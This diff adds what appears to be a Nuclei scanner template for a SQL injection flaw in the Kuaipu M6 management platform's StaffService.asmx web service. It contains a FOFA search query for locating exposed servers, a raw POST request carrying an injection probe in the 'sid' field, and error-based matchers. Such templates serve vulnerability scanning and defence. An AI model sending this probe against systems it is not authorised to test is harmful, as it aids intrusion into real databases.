@@ -1,0 +1,35 @@
+id: philip-m6-GetPositionOfStaff-sqli
+info:
+  name: 快普M6 WebService/StaffService.asmx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 快普M6整合管理平台的WebService/StaffService.asmx接口下多个方法存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过参数过滤机制，实现对数据库的任意查询、修改或删除操作，甚至可能获取系统控制权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/lmpzobhehustdwom
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="Resource/JavaScript/jKPM6.DateTime.js"
+    tips:
+    repair:
+    version:
+  tags: philip,sqli,philipm6
+
+http:
+  - raw:
+      - |
+        POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 11
+
+        sid=-1/user
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'nvarchar')
+        condition: and
